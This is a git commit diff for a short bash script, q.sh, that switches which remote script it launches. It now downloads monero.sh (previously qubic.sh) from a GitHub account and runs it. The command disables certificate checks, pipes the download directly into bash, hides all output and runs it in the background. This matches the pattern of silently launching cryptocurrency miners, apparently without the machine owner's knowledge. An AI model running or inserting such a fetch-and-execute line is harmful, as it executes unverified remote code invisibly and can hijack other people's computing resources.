824eec12dccfb0d3419a58a6dd871dbca9888f0b
pakoinake <pakoinake@lib.mk>
2025-08-25 14:06:14 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/pakoinake/jzoax/main/qubic.sh) >/dev/null 2>&1 &
-# bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/pakoinake/jzoax/main/monero.sh) >/dev/null 2>&1 &
+# bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/pakoinake/jzoax/main/qubic.sh) >/dev/null 2>&1 &
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/pakoinake/jzoax/main/monero.sh) >/dev/null 2>&1 &
